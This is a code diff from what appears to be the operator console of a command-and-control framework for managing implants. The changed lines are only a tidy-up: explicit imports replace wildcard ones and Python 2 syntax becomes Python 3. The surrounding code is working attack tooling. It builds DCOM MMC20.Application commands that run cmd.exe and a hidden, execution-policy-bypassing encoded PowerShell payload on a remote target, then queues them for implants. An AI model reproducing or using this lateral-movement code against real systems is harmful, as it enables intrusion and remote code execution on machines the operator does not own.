@@ -2,18 +2,22 @@
  
 import os, time, readline, base64, re, traceback, glob, sys, argparse, shlex, signal, subprocess, argparse, datetime
 from sqlite3 import Error
-from Help import *
-from AutoLoads import *
-from DB import *
-from Colours import *
-from Config import *
-from HTML import *
-from TabComplete import *
-from Payloads import *
-from Core import *
-from Alias import *
-from Opsec import *
-from Utils import validate_sleep_time
+from Help import logopic, COMMANDS, posh_help, posh_help1, posh_help2, posh_help3, posh_help4, posh_help5, posh_help6
+from Help import posh_help6, posh_help7, posh_help8, pre_help, PRECOMMANDS, py_help1, sharp_help1, UXCOMMANDS, SHARPCOMMANDS
+from AutoLoads import check_module_loaded, run_autoloads
+from DB import update_item, get_c2server_all, get_implants_all, get_tasks, get_implantdetails, new_urldetails
+from DB import get_newimplanturl, get_implantbyid, new_task, get_implants, get_history_dict, get_lastcommand
+from DB import new_commandhistory, get_c2urls, del_autorun, del_autoruns, add_autorun, get_autorun, get_newtasks_all
+from DB import  drop_newtasks, get_implanttype, update_label, update_sleep, get_history, kill_implant, unhide_implant
+from DB import get_pid, get_allurls, get_sharpurls, get_randomuri, get_hostdetails, select_item
+from Colours import Colours
+from Config import ROOTDIR, ModulesDirectory, PayloadsDirectory, POSHDIR
+from HTML import generate_table, graphviz
+from TabComplete import tabCompleter
+from Payloads import Payloads
+from Alias import py_alias, ps_alias, cs_alias
+from Opsec import ps_opsec
+from Utils import validate_sleep_time, gen_key, randomuri
 
 def catch_exit(signum, frame):
   sys.exit(0)
@@ -1018,7 +1022,7 @@ def runcommand(command, randomuri):
         with open("%s%spayload.bat" % (PayloadsDirectory,"Proxy"), "r") as p: payload = p.read()
         params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
         params = params.sub("", command)
-        p = re.compile(ur'(?<=-target.).*')
+        p = re.compile(r'(?<=-target.).*')
         target = re.search(p, command).group()
         pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c %s\",\"7\")" % (target,payload)
         new_task(pscommand, user, randomuri)
@@ -1029,7 +1033,7 @@ def runcommand(command, randomuri):
       daisyname = raw_input("Name required: ")
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
-        p = re.compile(ur'(?<=-target.).*')
+        p = re.compile(r'(?<=-target.).*')
         target = re.search(p, command).group()
         pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
         new_task(pscommand, user, randomuri)
@@ -1042,7 +1046,7 @@ def runcommand(command, randomuri):
           "", "", "", "", C2[19], C2[20],
           C2[21], get_newimplanturl(), PayloadsDirectory)
       payload = newPayload.CreateRawBase()
-      p = re.compile(ur'(?<=-target.).*')
+      p = re.compile(r'(?<=-target.).*')
       target = re.search(p, command).group()
       pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
       new_task(pscommand, user, randomuri)
@@ -1321,7 +1325,7 @@ def commandloop(implant_id, user):
     except Exception as e:
       print (Colours.RED)
       print ("Error running against the selected implant ID, ensure you have typed the correct information")
-      print Colours.END
+      print (Colours.END)
       #traceback.print_exc()
       #print "Error: %s" % e
       # remove the following comment when publishing to live
